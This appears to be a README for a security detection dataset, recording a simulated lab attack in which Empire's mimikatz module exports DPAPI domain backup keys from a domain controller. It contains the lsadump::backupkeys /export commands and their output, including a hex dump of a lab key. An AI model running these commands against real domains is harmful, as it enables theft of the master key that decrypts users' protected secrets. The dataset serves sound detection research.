# Empire Mimikatz Export Master Key

Data Protection Application Programming Interface (DPAPI) is used by Windows to securely protect passwords saved by browsers, encrypted files, and other sensitive data. Domain controllers hold a master key that can decrypt all secrets on domain-joined Windows machines. Mimikatz can be used to export the master key from the domain controller remotely.

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_mimikatz_export_master_key.tar.gz](./empire_mimikatz_export_master_key.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18235535

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |            2228 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               8 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               1 |
| System                                     | Microsoft-Windows-GroupPolicy       | na                                                     |               1 |
| System                                     | Service Control Manager             | na                                                     |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             217 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |             132 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             132 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              36 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              15 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              15 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |              12 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |              11 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Plug and Play Events                                   |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | SAM                                                    |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | DPAPI Activity                                         |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Security Group Management                              |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               2 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             405 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             258 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             254 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             211 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              87 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              77 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              39 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               9 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               5 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |            1995 |

## Attacker Activity

```
(Empire: powershell/credentials/mimikatz/command) > set Command lsadump::backupkeys /system:HFDC01.shire.com /export
(Empire: powershell/credentials/mimikatz/command) > execute
[*] Tasked 13GK9C5T to run TASK_CMD_JOB
[*] Agent 13GK9C5T tasked with task ID 1
[*] Tasked agent 13GK9C5T to run module powershell/credentials/mimikatz/command
(Empire: powershell/credentials/mimikatz/command) > Job started: DPB5F4
Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::backupkeys /system:HFDC01.shire.com /export

Current prefered key:       {a1b58ded-16ec-4822-ab1c-3a4cfb9c268a}
  * RSA key
	Exportable key : YES
	Key size       : 2048
	Private export : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.pvk'
	PFX container  : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.pfx'
	Export         : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.der'

Compatibility prefered key: {116228fd-901d-4386-853a-9611c3c93e28}
  * Legacy key
aff6c7adc1e0ddc685fae1fd657a1f6756df313f9b149f4af78949700de1022f
e921157be464fc5cd40ceec73694e565bcab123780f285a5cd678af40cf5f0bb
ec9e6b981966d12e5a7de25073fbb716a0e435d1dfee8c55bf5725172161f9d3
06f4e00ffa1bc37de63719a7e5173ce20b69dc2764664535435aab7afbc1d332
f0c7837839ab891efcb6dc9490746d35aab45efc5e72a7270186ae0260d1ad0f
28e5cbe391c9df45dd38e7e5681df55a216a2d50e4de0d8cdd33dde8806569ee
fe3e906081c4d1c18e4f42461133a2646fce2a37773ea15bbaae5fef01c0997e
f19dcfaf5582ab001056b8fe921c5f5c896f145fef1dfeda8ebe9ef4fd4fccdb

	Export         : OK - 'ntds_legacy_0_116228fd-901d-4386-853a-9611c3c93e28.key'

(Empire: powershell/credentials/mimikatz/command) >
```